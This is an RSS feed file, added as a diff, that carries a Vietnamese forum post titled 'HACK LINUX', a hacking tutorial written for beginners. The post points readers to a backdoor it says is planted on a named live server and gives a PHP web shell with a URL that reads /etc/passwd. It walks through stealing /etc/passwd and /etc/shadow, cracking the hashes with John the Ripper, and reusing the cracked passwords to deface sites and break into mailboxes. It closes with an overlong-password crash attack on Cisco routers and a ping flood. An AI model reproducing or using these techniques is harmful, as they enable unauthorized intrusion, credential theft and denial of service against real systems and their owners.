@@ -1,0 +1,1629 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0">
+	<channel>
+		<title><![CDATA[Latest posts for the topic "HACK LINUX"]]></title>
+		<link>http://www.hvaonline.net/hvaonline/posts/list/12.hva</link>
+		<description><![CDATA[Latest messages posted in the topic "HACK LINUX"]]></description>
+		<generator>JForum - http://www.jforum.net</generator>
+			<item>
+				<title>HACK LINUX</title>
+				<description><![CDATA[ Tác giả: (Someone) ????
+
+HACK LINUX 
+Cơ bản Hack Linux 
+
+Chào các bạn ! Hôm nay mình xin giới thiệu với các bạn đôi chút cơ bản về server chạy Linux . 
+Để tiện phục vụ bài học mình xin lấy luôn một server để các bác thực hành . 
+<span class="link"> http://www.4me.ru/kozar/remview.php</span> 
+
+Site này đã được gắn 1 con Backdoor các bạn có thể xem được toàn bộ dữ liệu của server bằng cách click đến nơi mà mình muốn . Backdoor này có tác dụng mạnh hơn cả NTDADDY.ASP đối với NT . 
+
+Bắt đầu nha : 
+
+Mình xin giới thiệu sơ luợc qua một vài thư mục quan trọng trên server : 
+/home : nơi lưu giữ các file người sử dụng(VD : người đăng nhập hệ thống có tên là Micro thì sẽ có 1 thư mục là /home/Micro) 
+/bin : Các lệnh Unix cơ bản cần thiết như ls chẳng hạn . 
+/usr/bin : các lệnh khác , các lệnh dùng bởi người sử dụng đặc biệt và dùng quản trị hệ thống . 
+/bot : Nơi mà kernel và các file khác được dùng khi khởi động . 
+/ect : Các file hoạt động phụ mạng , NFS (Network File System ) Thư tín ( Đây là nơi mà chúng ta cần khai thác nhiều nhất ) 
+/var : Các file quản trị như file bản ghi được các thiết bị sử dụng . 
+/usr/lib : Các thư viện chuẩn như libc.a 
+/usr/src : Vị trí nguồn của các chương trình . 
+
+OK ! Bây giờ mình chuyển sang vấn đề mật khẩu : 
+
+Mọi account trên hệ thống đều có một mục nhập file /ect/passwd ( Các bạn có thể dùng chức năng của backdỏo để xem nội dung file này ) 
+Mỗi mục nhập file passwd có định dạng sau : 
+username:password:uid:gid:geos:homedir:shell 
+
+Ví dụ : root:*:0:1:System PRIVILEGED Account,,,:/:/bin/csh 
+
+Đây gọi là trường password . 
+Username: Tên người sử dụng 
+Password: Pass của nguời dùng 
+UserID: Số nhận diện người dùng 
+GroupID: Số nhận diện nhóm 
+Geos : vài thông tin về ngườ sử dụng 
+Home Direcoty: Thư mục ngườ đăng nhấp 
+Shell : nơi mà chứa lệnh shell cho người s% 
+<span class="link"> http://www.4me.ru/kozar/remview.php</span> 
+
+Thường thì password bị mã hoá , nhưng ta có thể dùng 1 số chương trình Crack đựơc ( Tôi sẽ hướng dẫn Crack vào phần sau ) Vì vậy ngừơi ta đã khắc phục bằng cách nghĩ ra mật khẩu bóng (Shadow password ) . Khi mật khẩu bóng được dùng , trừơng mật khẩu trong /ect/passwd chỉ chứa 1 dấu X hoặc 1 dấu * mà không bao giờ xuất hiện trong phiên bản mật mật khẩu dã được mã hoá . Thay vào dó người ta dùng file thứ 2 có tên gọi Shadow ( /ect/shadow ) 
+File này chứa các mục nhập mà thoạt nhìn rất giống với mục nhập trong /ect/passwd , nhung chứa mật khẩu thực được mã hoá trong trường mật khẩu . 
+Chỉ có thể đọc được shadow bằng gốc . Trong truờng password của Shadow chỉ có username và password là có thật bị mã hóa còn các phần khác là không có thực hoặc bỏ trống . 
+
+Đây là vị trí của file password của 1 số phiên bản khác nhau : 
+Version Path Token 
+----------------------------------------------------------------- 
+AIX 3 /etc/security/passwd ! 
+/tcb/auth/files// 
+A/UX 3.0s /tcb/files/auth/?/* 
+BSD4.3-Ren /etc/master.passwd * 
+ConvexOS 10 /etc/shadpw * 
+ConvexOS 11 /etc/shadow * 
+DG/UX /etc/tcb/aa/user/ * 
+EP/IX /etc/shadow x 
+HP-UX /.secure/etc/passwd * 
+IRIX 5 /etc/shadow x 
+Linux 1.1 /etc/shadow * 
+OSF/1 /etc/passwd[.dir|.pag] * 
+SCO Unix #.2.x /tcb/auth/files// 
+SunOS4.1+c2 /etc/security/passwd.adjunct ##username 
+SunOS 5.0 /etc/shadow 
+
+System V Release 4.0 /etc/shadow x 
+System V Release 4.2 /etc/security/* database 
+Ultrix 4 /etc/auth[.dir|.pag] * 
+UNICOS /etc/udb * 
+
+File nhóm ( ect/group ) 
+Hầu hết các Hacker không quan tâm đến file này nhung tôi thấy cần phải nói vì nó cung quan trong . 
+Ðịnh dạng của file này là : 
+Groupname:password:gid:member 
+
+VD: lbin:*:1:root,daemon 
+tên nhóm là : lbin 
+pass : * ( o tồn tại --> nó nằm trong Shadow ) 
+1 : số nhóm 1 (nhóm o là root ) 
+người được sử dụng là : root , daemon 
+
+Trường password của file group đôi khi khá kỳ lạ. nó không được sử dụng nhiều ,nhưng khi kết hợp với trình newgrp , nó cho phép những người sử dụng không phải là thành viên của 1 nhóm có thể có thừa nhận định danh . ( Mình sẽ nói đến phần sau ) 
+
+Trong khi sử dụng Backdoor để khai thác hệ thống bạn sẽ gặp 1 số lỗi xảy ra như acces denied hoặc permission denied . Ðây là lỗi khi bạn dùng chức nang xem 1 thu mục hoặc 1 file đã bị ấn định quyền sở hữu và hạn chế khả năng truy cập . Vậy phải làm sao , chắc bạn cũng đã nghe nói đến LEO THANG ÐẶC QUYỀN chứ . OK chúng ta sẽ làm đựơc mọi thứ nếu chúng ta nằm ở vị trí ROOT . 
+
+Nhung trứơc tiên chúng ta sẽ tìm hiểu về giới hạn sử dụng file . 
+Giới hạn sử dụng là cách thức dùng file mà ngườ sử dụng có thể thực hiện được trong Unix . Có 3 giớ hạn sử dụng : 
++Cho phép đọc ( Read ): bạn có thể xem nội dung file 
++cho phép sửa đổi (Write) : Bạn có thể thay đổi hoặc xoá file . 
++Cho phép thi hành (Excute) : Nghia là bạn là b?n có thể chạy file nhu 1 truong trình ( Bạn chú ý cái này cho phép ta run Backdoor trên server ) 
+
+Mình lấy ví dụ : Các bạn thử dùng chức năng info của Backdoor đối với 1 file trên server xem sao : 
+ban sẽ thấy : 
+-rwx r-x r-x 
+
+Dấu ghạch ngang đầu (-) kí hiệu là đây là 1 file 
+3 ký tiếp theo (rwx) : nói lên chủ sở hữu có thể được ,ghi và thi hành ) 
+tiếp theo : r-x : nói lên nhóm có thể đọc và thi hành 
+ti?p theo : r-x : những nguời khác có thể đọc và thi hành . 
+nói chung nó la ký hiêu của Read-Write-Excute . 
+Có thể hiểu trong từng mức có 3 bit tuong ứng với giới hạn sử dụng ( Các bạn còn nhớ cách Chmod file để làm Forum chứ , đấy đấy chính nó ) 
+
+Lần sau mình sẽ hướng dẫn cách Crack file password bằng Jonh , và các lệnh để xâm nhập vào server , và thực hiện các lệnh trên server . 
+Dần dần bạn sẽ học được cách Hack 1 cách chuyên nghiệp hơn thông qua FPT , TFTP , PHF , RPC , NIS , Senmail , WU-FTP Server , BIND . 
+
+1 lời khuyên : không có gì hay hơn là bạn nên cài thử Linux xem sao . OK 
+
+Ngoài chương trình trên ra, ta còn có thể tự viết một đoạn PHP như sau : 
+<? 
+$output = `$cmd`; 
+echo $output; 
+?>Ví dụ : Sau đó lưu đoạn mã này với tên là hack.php. Khi upload lên, ta thực hiện lệnh như sau : 
+www.tentrangweb.com/hack.php?cmd=cat+/etc/passwd 
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
+Hướng dẫn bẻ mật khẩu của Unix bằng John The Ripper : 
+
+
+
+-------------------------------------------------------------------------------- 
+
+Lấy file passwd 
+Crack file passwd 
+Single crack 
+Crack bằng wordlist (+rules) 
+Incremental crack 
+External crack 
+Sử dụng các passwd đã bị crack 
+
+-------------------------------------------------------------------------------- 
+
+I. Lấy file passwd 
+
+Bạn có thể khai thác một lỗ hỏng bảo mật trên server, chẳng hạn như chỗ yếu cgi hoặc lỗi tràn bộ đệm, ... sau đó get file /etc/passwd & /etc/shadow 
+
+TH1: nếu passwd chưa bị shadow 
+cat /etc/passwd > password.txt 
+
+* nếu server đang chạy NFS, bạn phải dùng ypcat(yellow pages cat) & grep -s thay cho cat: 
+ypcat /etc/passwd | grep s > password.txt 
+
+TH2: nếu passwd đã bị shadow, bạn phải cat cả file /etc/passwd & /etc/shadow, sau đó unshadow cho passwd: 
+cat /etc/passwd 
+cat /etc/shadow 
+unshadow passwd shadow > password.txt 
+
+
+-------------------------------------------------------------------------------- 
+
+II. Crack file passwd 
+
+Trước khi crack file passwd, tôi muốn giới thiệu sơ lược cho bạn về format của file passwd. Đây là một file text chứa các thông tin về user trên server. Mỗi dòng trong file này có dạng như sau: 
+
+LWait:0m8Car45jNxHQ:1000:2000:John Doe:/home/litewait:/bin/csh 
+
+LWait login name 
+0m8Car45jNxHQ encrypted passwd 
+1000 user id 
+2000 group id 
+John Doe real name 
+/home/litewait home dir 
+/bin/csh shell 
+
+* encrypted passwd=="*" -> account này đã bị vô hiệu, đừng mất công để crack passwd của account này! 
+* encrypted passwd=="+" -> passwd đã bị shadow, bạn phải unshadow trước khi crack 
+
+Ok, bây giờ chúng ta sẽ crack file password.txt! Có 4 cách để crack passwd: 
+
+1. Single crack 
+
+- được dùng để crack các weak passwd 
+
+C:\john>john -single password.txt 
+Loaded 585 passwords with 128 different salts (Standard DES [24/32k]) 
+thomas (mrice) 
+guesses: 1 time: 0:00:00:44 29% c/s: 86654 trying: bja$on - m4ry4nnr 
+guesses: 1 time: 0:00:06:27 100% c/s: 33653 trying: aamy1961 - bamy1969 
+
+( password.txt: file passwd cần crack) 
+
+JTR vừa crack được 1 passwd "thomas" của username "mrice"(passwd luôn đứng trước username). JTR cũng đang đoán các passwd từ bja$on -> m4ry4nnr. 1961, 1969? "Rất có thể có năm sinh của user trong passwd", JTR nghĩ vậy đó;) 
+
+
+-------------------------------------------------------------------------------- 
+
+2. Crack bằng wordlist (+ rules) 
+
+- JTR đã có sẵn file wordlist "password.lst"! Bạn không cần phải thêm vào những từ đại loại như "tEST", "Test", ... Chỉ cần một từ "test" trong file wordlist là đủ. Khi crack bằng wordlist có dùng thêm rules, JTR sẽ tự động dùng thêm "tEST", "Test", ..., "test123", ... để đoán passwd! 
+
+C:\john>john password.txt -w:password.lst -rules 
+Loaded 584 passwords with 128 different salts (Standard DES [24/32 4K]) 
+julianne (thutchcr) 
+mizzou (slymer) 
+hal9000 (csalzman) 
+hammer (preardon) 
+scoobydo (sfuemmel) 
+mylord (gdessieu) 
+scoobydo (jreynold) 
+guesses: 7 time: 0:00:00:46 100% c/s: 100468 trying: owl - 0wl 
+
+(-w:<file wordlist>) 
+
+JTR vừa đoán được 8 passwd! 
+
+* Cách đặt luật cho JTR: để đặt luật cho chế độ crack bằng wordlist, bạn hãy hiệu chỉnh phần "List.Rules:Wordlist" trong file cấu hình của JTR, "john.ini" 
+
+# Wordlist mode rules 
+[List.Rules:Wordlist] 
+
+(tất cả các dòng bắt đầu bằng dấu # trong file john.ini được coi là các dòng chú thích) 
+
+Xem các ví dụ sau sẽ rõ về cách đặt luật cho JTR! 
+>4<7 
+chỉ chọn các từ có chiều dài >4 && <7 kí tự, tức là dài 5->6 kí tự 
+>5<7lc 
+chỉ kiểm tra các từ dài 6 kí tự, sau đó viết thường(lowercase) & viết hoa kí tự đầu tiên(capital), aBcDeF -> Abcdef 
+
+l<9/ese3 
+lowercase và swap 'e' thành '3'; loại bỏ các từ không chứa 'e' hoặc dài hơn 8 kí tự, tesT -> t3st 
+>2<4/isi1 
+lowercase và swap 'i' thành '1'; loại bỏ các từ không chứa 'i' hoặc không dài đúng 3 kí tự 
+
+l<8/isi1^[0-9] 
+lowercase, swap 'i' thành '1' và thêm 0-9 vào đầu; loại bỏ các từ không chứa 'i' hoặc dài quá 7 kí tự, Vicki -> 0v1ck1, 1v1ck1, 2v1ck1, ..., 9v1ck1 
+
+'7/ese3/isi1$[0-9] 
+xén bớt các kí tự bên phải của các từ dài hơn 8 kí tự, swap 'e' thành 3 và 'i' thành '1', sau đó thêm 0-9 vào cuối; loại bỏ các từ không chứa 'i' & 'e', zhaowei-ww -> zhaow310, zhaow311, ..., zhaow319 
+>4<6T1^[0-9]^[0-9] 
+từ phải dài 5 kí tự, đổi kiểu chữ của kí tự thứ 2(ở vị trí 1), sau đó thêm 0-9, 0-9(hai số sau của năm sinh) vào đầu, vIcki -> 00vicki, 10vicki, ..., 99vicki 
+
+'7T0$[aeiou0-9] 
+xén bớt các kí tự bên phải của các từ dài hơn 8 kí tự, đổi kiểu chữ của kí tự thứ 1(ở vị trí 0), sau đó thêm các nguyên âm hoặc 0-9 vào sau, zhaowei1976 -> Zhaoweia, Zhaoweie, ... Zhaowei0, ..., Zhaowei9 
+
+i0[v]i3[k] 
+chèn 'v' vào vị trí 0 và 'k' vào vị trí 3, ici -> vicki 
+
+o4[123] 
+ghi đè lên kí tự thứ 5(ở vị trí 4) bằng '1', '2' hoặc '3', zhaowei -> zhao1ei, zhao2ei, zhao3ei 
+
+=0?d$7 
+bỏ qua các từ không bắt đầu bằng 1 digit, thêm 7 vào sau, 7vicki -> 7vicki7 
+@?w 
+xoá bỏ các kí tự trắng, zhao wei -> zhaowei 
+
+%2i 
+chỉ chọn các từ có 2 chữ 'i' trở lên, vicki -> vicki 
+
+Bạn có thể tìm thấy nhiều ví dụ khác trong file john.ini và tài liệu đi kèm của JTR. Nếu bạn muốn xem output của các luật mà bạn đã đặt, hãy nhập vào: 
+
+john -w:wordfile.dic -rules -stdout > output.file 
+
+
+-------------------------------------------------------------------------------- 
+
+3. Incremental crack 
+
+- chế độ này cho phép bạn đoán tất cả các khả năng của passwd. Bạn dùng tùy chọn -i:<mode> như sau: 
+
+john password.txt -i:all 
+thử hết mọi khả năng 
+
+john password.txt -i:alpha 
+passwd chỉ gồm các kí tự alpha(a-z) 
+
+john password.txt -i:digits 
+passwd chỉ gồm các kí tự số(0-9) 
+
+Để cấu hình cho chế độ "Incremental", bạn hãy hiệu chỉnh phần "Incremental" trong file john.ini 
+
+[Incremental:All] 
+File = ~/all.chr 
+MinLen = 0 
+MaxLen = 8 
+CharCount = 95 
+
+[Incremental:Alpha] 
+File = ~/alpha.chr 
+MinLen = 1 
+MaxLen = 8 
+CharCount = 26 
+
+[Incremental:Digits] 
+File = ~/digits.chr 
+MinLen = 1 
+MaxLen = 8 
+CharCount = 10 
+
+* Ngoài các tập kí tự mặc định all.chr, alpha.chr, digits.chr, ..., bạn có thể xây dựng cho mình một tập kí tự riêng để dùng trong chế độ crack "Incremental". Ở đây, tôi làm thử một ví dụ cho bạn thấy! 
+
+Đầu tiên, chúng ta cần backup file john.pot. File này chứa các passwd vừa bị crack! 
+
+copy john.pot john.bak 
+del john.pot 
+
+Giờ thì bạn mở Notepad, tạo file john.pot mới với nội dung như sau: 
+
+:betyouca 
+:ng351 
+
+Lưu ý, mỗi dòng trong file john.pot phải bắt đầu bằng một dấu ":", tiếp theo là các kí tự. Chiều dài tối đa của các kí tự trên một dòng(trừ dấu ":") là 8, tương ứng với maxlength của unix plaintext passwd! 
+
+Lưu file john.pot và chạy JTR: 
+
+C:\john>john -make:betyou.chr 
+Loaded 2 plaintexts 
+Generating cracking order... DONE 
+Successfully written charset file: betyou.chr (13 characters) 
+
+Chúng ta vừa tạo xong file tập kí tự có tên là betyour.chr. Bây giờ bạn hãy hiệu chỉnh file john.ini, đến phần "Incremental" và thêm vào các dòng sau: 
+
+[Incremental:betyou] 
+File = ~/betyou.chr 
+MinLen = 3 
+MaxLen = 7 
+CharCount = 13 
+
+File=~/betyou.chr(file tập kí tự, ~/ == home dir) 
+MinLen=3 & MaxLen=7 -> JTR chỉ đoán các passwd có chiều dài từ 3->7 kí tự 
+CharCount=13 -> số kí tự có trong tập kí tự này, đây là số mà thấy khi tạo file betyou.chr ở trước. Nếu bạn gán CharCount=100, JTR sẽ báo lỗi "chỉ có thể load được x kí tự". Hãy thay thế 100 bằng x 
+
+Đến đây, chúng ta có thể sử dụng tập kí tự mới để crack passwd. Bạn hãy nhập vào: 
+
+john password.txt -i:betyou 
+
+
+-------------------------------------------------------------------------------- 
+
+4. External crack 
+
+JTR còn cho phép bạn lập trình để crack passwd. Cú pháp lệnh y chang như của C vậy. Bạn hãy xem ví dụ sau, nó có nhiệm vụ lọc các từ có chứa kí tự alpha(a-z). 
+
+[List.External:Filter_Alpha] 
+void filter() 
+{ 
+int i, c; 
+
+i = 0; 
+while (c = word[i++]) 
+if (c < 'a' || c > 'z') { 
+word = 0; return; 
+} 
+} 
+
+Chi tiết về chế độ crack này, bạn xem thêm trong tài liệu hướng dẫn đi kèm của JTR! 
+
+
+-------------------------------------------------------------------------------- 
+
+Tôi muốn nói thêm với các bạn một số vấn đề khác có liên quan khi crack passwd bằng JTR! 
+
+- nếu bạn chỉ muốn crack các user hoặc group cụ thể nào đó, hãy dùng tùy chọn -user hoặc -group(xem ví dụ sau) 
+
+john password.txt -user:LWait 
+chỉ crack passwd của user "LWait" 
+
+john password.txt -group:123 -i:custom 
+chỉ crack passwd của các user trong group có ID là 123 
+
+- crack passwd là một công việc tốn khá nhiều thời gian, có khi phải lên đến mấy ngày trời mới crack được vài passwd. Để tạm dừng tiến trình crack hiện tại, bạn hãy ấn Ctrl-C. Khi nào rãnh, bạn có thể restore lại tiến trình bằng cách gõ vào: 
+
+john -restore 
+
+- nếu bạn muốn crack nhiều file passwd cùng một lúc, bạn có thể sử dụng tùy chọn -session để làm việc đa phiên: 
+
+john session:zebpasses 
+
+Để restore lại session zebpasses, hãy nhập vào: 
+
+john -restore:zebpasses 
+
+Nếu bạn cần xem tiến độ crack của session này, hãy nhập vào: 
+
+john -status:zebpasses 
+
+Hoặc nếu bạn muốn biết JTR đã crack được bao nhiêu passwd trong file password.txt, hãy nhập vào: 
+
+john -show password.txt 
+
+- trong khi crack, bạn có thể bấm phím space để xem tiến độ crack. Nếu bạn thích JTR kêu bíp một cái khi vừa crack xong một passwd, hãy hiểu chỉnh phần "Options" trong file john.ini như sau: 
+
+[Options] 
+... 
+Beep = Y 
+... 
+
+- Bạn có muốn tăng tốc cho tiến trình crack không? Đừng nên mở nhiều chương trình khác khi đang chạy JTR. Nếu bạn đang chạy JTR trên Windows, hãy thay thế file john.exe bằng file mới trong file john-mmx.zip nếu chip CPU của bạn là Pentium hoặc trong file john-k6.zip nếu bạn đang dùng chip của AMD. Nếu bạn đang xài Linux, hãy tận dụng ngay sức mạnh của Linux. JTR phá passwd khá nhanh trên Linux;) 
+
+
+-------------------------------------------------------------------------------- 
+
+III. Sử dụng các passwd đã bị crack 
+
+Nhiều người thường sử dụng y chang một passwd để login telnet, ftp hay pop3(mail). Vì vậy, bạn có thể thử passwd này để login vào ftp account của họ, thay đổi trang web của họ hay để lại vài lời nhắn trong mailbox của họ! 
+
+Chúc bạn thành công! 
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
+Hack vào hệ thống CisCo của Linux : 
+
+
+
+
+Hệ thống Cisco được chạy trên server Unix . Nó là 1 hệ thống truyền thông tin theo kiểu những gói dữ liệu , vì vậy khi bạn sẽ ngạc nhiên khi làm sao ta có thể nắm bắt được những tín hiệu của cisco . Thường thì các hệ thống Cisco rất quan trong , nên khi ta hack được vào 1 hệ thống cisco ta có thể nắm bắt những thông tin quan trong của khách hàng , hay thông tin về thẻ tín dụng . Vì vậy các bạn nên chú ý đến tác hại của nó . 
+
+
+Yêu cầu trong bài này các bạn phải biết được những định nghĩa sau : 
+
+- Thế nào là 1 địa chỉ IP 
+
+- Thế nào là 1 ISP 
+
+- Thế nào là 1 TCP/IP packet 
+
+- Cách biến đổi IP của bạn 
+
+- Cách sử dụng Telnet 
+
+- Cách sử dụng Hyper Terminal 
+
+- Cách sử dụng Ping 
+
+- Cách sử dụng TraceRoute 
+
+- Cách sử dụng 1 proxy server 
+
+
+Những kiến thức trên đối với các Hacker thì quá quen thuộc rồi , nhưng đối với những newbie thì có lẽ cũng hơi lơ mơ có phải không . 
+
+
+Vậy thì mình cũng xin giới thiệu qua một chút nha : 
+
+
+1 - IP là gì ? 
+
+
+IP có thể được coi là 1 địa chỉ của 1 máy tính khi được kết nối vào Internet . Nó được các nhà phục vụ mạng ( ISP) gán cho máy tính cá nhân của bạn khi bạn kết nối đến nhà cung cấp dịch vụ . 
+
+Có 2 loại IP : đó là IP tĩnh và IP động . thường các bạn nối net bằng PC cá nhân thì là IP động . Còn IP của những server cung cấp Hosting hay Domain trên mạng có IP tĩnh . 
+
+IP động là loai mỗi khi vào mạng bãn sẽ có 1 IP khác nhau 
+
+IP tĩnh là loại chỉ có duy nhất 1 IP cho tât cả các loại kết nối tại các thời điểm khác nhau . 
+
+
+IP của ban có thể bị nắm dữ của ngời khác thông qua những cách sau : 
+
+- khi bạn truy cập vào 1 website , IP của bạn đã được lưu dữ trong 1 file Log 
+
+- Khi ban trên IRC thì bất cứ ai cũng có thể có IP của bạn . 
+
+- Khi bạn trên ICQ thì những ngời muốn có IP của bạn thì sẽ lấy được cho dù bạn đã không cho hiển thi IP 
+
+- Nếu bạn đang được kết nối với 1 máy tính của ai đó , họ có thể sử dụng lệnh " systat" và xem ai đang được kết nối đến họ 
+
+- Nếu bạn gửi một email tới 1 ai đó , thì họ cũng có được IP của bạn . 
+
+
+Còn rất nhiều cách xác định 1 IP của 1 ngời , trong đó còn bao gồm cae những chương trình mở cửa sau nhưSub7 và Netbios . 
+
+
+2. ISP là gì ? 
+
+
+ISP là 1 nhà cung cấp mạng Internet cho bạn . Bạn có thể kết nối với ISP mọi lúc bàng cách dial-up với số cung cấp dịch vụ của ISP . Bạn có thể nhìn thấy ISP của bạn là gì bằng cách rất đơn giản là chạy 1 Traceroute trên máy bạn . ( Traceroute sẽ được nói ở sau ) Bạn sẽ nhìn thấy những gì bạn muốn . 
+
+
+Vidụ : tracert 222.222.22.22 
+
+
+Tracing route to [221.223.24.54] 
+
+over a maximum of 30 hops. 
+
+1 147ms 122ms 132ms your.isp [222.222.22.21] 
+
+2 122ms 143ms 123ms isp.firewall [222.222.22.20] 
+
+3 156ms 142MS 122ms aol.com [207.22.44.33] 
+
+4 * * * Request timed out 
+
+5 101ms 102ms 133ms cisco.router [194.33.44.33] 
+
+6 233ms 143ms 102ms something.ip [111.11.11.11] 
+
+7 222ms 123ms 213ms netcom.com [122.11.21.21] 
+
+8 152ms 211ms 212ms blahblah.tts.net [121.21.21.33] 
+
+9 122ms 223ms 243ms altavista.34.com [121.22.32.43] <<< target's isp 
+
+10 101ms 122ms 132ms 221.223.24.54.altavista.34.com [221.223.24.54] 
+
+Trace complete. 
+
+
+----------------------------------- 
+
+Nhìn thấy rồi chứ ! OK 
+
+
+3 . Thế nào là 1 TCP/IP packet ( gói dữ liệu TCP/IP ) 
+
+
+TCP/IP có nghĩa là Transmission Control Protocol và Internet Protocol , 
+
+Một TCP/IP packet là 1 khối dữ liệu được nén , và một đầu mục được đặt tên nó và được gửi cho máy tính khác theo chuẩn thức TCP/IP . Đầu mục trong 1 gói chứa đựng IP của máy tính được gửi đi và máy tính được gửi đến làm cho gói dữ liệu đến đúng mục tiêu ngời nhận . Bạn có thể Read-write 1 gói dữ liệu làm cho nó có vẻ đến bất kỳ ai , bạn sẽ thu được tất cả những những kết nối đến hệ thống chủ mà không có điều gì xảy ra . 
+
+
+4. Cách biến đổi IP ,hoặc không cho phép bắt giữ IP của bạn : 
+
+
+Bạn hãy tìm chương trinh : Genius 2 or DC IS nó sẽ giúp bạn làm điề đó . 
+
+
+5 . Cách sử dụng Telnet 
+
+
+Rất đơn giản bạn chỉ việc click vao Start menu --> Run ; rồi gõ telnet . Bạn sẽ gọi được chương trình telnet . Bạn có thể vao Terminal>Preferences để thay đổi thông số . 
+
+Bạn muốn kết nối tới đâu chỉ việc vào Conect --> Remote System . Rồi đánh Host name cho địa chỉ cần đến . va port . Đối với port : 23 dùng cho telnet , port : 21 dùng cho FTP và port 25 dùng cho dịch vụ sentmail . Có rất nhiều cổng . Sau này nếu bạn là 1 Hacker giỏi bạn có thể gắn Backdoor mở cổng hậu bất kỳ nào mà bạn muốn . 
+
+
+
+6 Cách sử dụng HyperTerminal 
+
+
+
+HyperTerminal cho phép bạn mở một server trên bất kỳ port nào của máy tính , và cho phép lăng nghe những thông tin đầu vào từ những máy tính xác định . 
+
+Bạn muốn thiết lập nó hãy vào : Start>Programs>Accessories>Communications>HyperTerminal 
+
+
+trước hết bạn cần lựa chọn kết nối , bạn chon "TCP/IP Winsock" , và cần chon 1 cổng bất kỳ trên máy tính , mình sẽ chọn cổng 23 chẳng hạn , Sau đó các bạn thiết lập chế độ Call>Wait for Call 
+
+
+OK ! bây giờ các máy tính khác có thể nối với máy tính bạn trên cổng đó và có thể chia sẻ với nhau những dữ liêu . 
+
+
+7 . Cách sử dụng lệnh ping 
+
+
+Lệnh Ping giúp cho ta biết thông tin về IP hay address mà chúng ta quan tâm . 
+
+Ban chỉ cần mở cửa sổ MS-DOs prompt rồi gõ : 
+
+
+ping diachitrangweb.com 
+
+
+hoăc: 
+
+
+ping ip.máytínhbạnmuốntấncông. 
+
+
+Liệu lệnh Ping có tác hại gì không , chắc chắn tôi sẽ nhận được 1 câu trả lời rằng không . Nhầm rồi các bạn ạ . 1 hệ thống có thể bị Crash nếu ta gửi hàng loạt lệnh ping đến ( Ping floods ) . 
+
+
+
+8 .Cách sử dụng TraceRoute 
+
+
+Để đánh dấu tất cả kết nối của bạn , và nhìn thấy tất cả các máy tính có giữa bạn và 1 đích . Bạn chỉ việc mở MS-DOS prompt và gõ : 
+
+
+tracert ip.address(IP của 1 máy tính bất kỳ) 
+
+
+Bạn sẽ nhìn thấy 1 danh sách các máy tính giữa bạn và máy tính đích . 
+
+Bạn có thể sử dụng điều này để kiểm tra xem có friewall ngăn cách bất cứ cái gì . Và cũng cho phép bạn ai là ISP ( cung cấp dịch vụ mạng ) 
+
+
+
+9 . Cách sử dụng một proxy server 
+
+
+Thôi cái này các bạn phải tự biết , Vì nếu mà không biết cách sử dụng Proxy thì đừng đọc bài này làm gì ! 
+
+
+Ôi mệt quá ! Học kểu này phải nói hết ra những thứ cơ bản mệt phờ râu ! 
+
+
+Bắt đầu Hack nào anh em : 
+
+
+
+I Cách tìm 1 cisco router ( hệ thống chạy cisco ) 
+
+
+Việc tìm thấy một chương trình chuyển vận cisco là một nhiệm vụ khá dễ , gần nhưmỗi ISP sẽ ấn định tuyến đờng xuyên qua ít nhất một chương trình chuyển vận Cisco . 
+
+Cách dễ nhất để tìm thấy một chương trình chuyển vận cisco sẽ chạy một traceroute ( Bằng cách mở MS-DOS prompt gõ "tracert" và địa chỉ IP của bất cứ 1 máy tính nào . Xem lại cách sử dụng traceroute ở phần trên ) Khi đó nó sẽ cho ta thấy tât cả những hệ thống máy tính có giữa máy tính của bạn và của máy tính mà ban vua dùng để tracert . Một trong số những hệ thống này có lẽ sẽ có tên " Cisco " 
+
+
+Ví du : 
+
+
+tracert 222.222.22.22 
+
+
+Tracing route to [221.223.24.54] 
+
+over a maximum of 30 hops. 
+
+1 147ms 122ms 132ms your.isp [222.222.22.21] 
+
+2 122ms 143ms 123ms isp.firewall [222.222.22.20] 
+
+3 156ms 142MS 122ms aol.com [207.22.44.33] 
+
+4 * * * Request timed out 
+
+5 101ms 102ms 133ms cisco.router [194.33.44.33] 
+
+6 233ms 143ms 102ms something.ip [111.11.11.11] 
+
+7 222ms 123ms 213ms netcom.com [122.11.21.21] 
+
+8 152ms 211ms 212ms blahblah.tts.net [121.21.21.33] 
+
+9 122ms 223ms 243ms altavista.34.com [121.22.32.43] <<< target's isp 
+
+10 101ms 122ms 132ms 221.223.24.54.altavista.34.com [221.223.24.54] 
+
+Trace complete. 
+
+
+Bạn nhìn thấy dòng số 5 cha : 5 101ms 102ms 133ms cisco.router [194.33.44.33] 
+
+
+Đây chính là 1 hệ thống chạy Cisco , Bạn hãy ghi nhớ IP của nó là 194.33.44.33 để chúng ta tấn công hê hê ... 
+
+
+II Cách tấn công hệ thống Cisco 
+
+
+Một Cisco routers thường chạy bản V4.1 (mà hầu hết là vậy) . Ta có thể dễ dàng vô hiệu hoá được chúng . 
+
+
+Bắt đầu : Bạn hãy kết nối tới cổng 23 của hệ thống Cisco với IP đã có ở trên . (Chính là Telnet ấy mà , xem lại cách sử dụng ở trên) Nhưng nên nhớ phải thông qua proxy server (cái này tuỳ bạn) 
+
+Khi kết nối tới cổng 23 của server chạy Cisco thường thì bạn không cần nhập username , mà nó sẽ đòi password của bạn , lúc này bạn hãy nhập vào một chuỗi password khổng lồ bất kỳ như: 
+
+
+10293847465qpwoeirutyalskdjfhgzmxn cbv019dsk10293847465qpwo eirutyalskdjfhgzmxncbv019dsk10293847465qpwoeirutyalskdjfhgzmxn cbv019dsk10293847465qpwoeirutyalskdjfhgzmxncbv019dsk10293847465 qpwoeirutyalskdjfhgzmxncbv019dsk10293847465qpwoeirutyalskdjfhg zmxncbv019dsk10293847465qpwoeirutyalskdjfhgzmxncbv019dsk10293847465qpwoeirutyalskdjfhgzmxncbv019dsk 
+
+Rồi Enter ! Bạn hãy chờ đợi , có thể hệ thống Cisco sẽ Reboot , Và cũng có thể bạn không thể Hack nếu nhưlúc này hệ thống đang ở chế độ offline . 
+
+Nhưng hãy thử chờ 2-10 phút , có thể bạn sẽ được login vào bên trong . 
+
+Nếu không xảy ra thì có lẽ nó không phải là chạy 1 software vul . Tại trờng hợp đó bạn hãy làm vài cái Dos attacks bằng cách gửi nhiều lệnh Ping đến hệ thống cho nó down đi cho bõ tức he he ... Bằng cách vào MS-DOS prompt gõ : 
+
+
+ping -l 56550 cisco.router.ip -t -----> he he .. ai bảo không cho ông mày vào . 
+
+
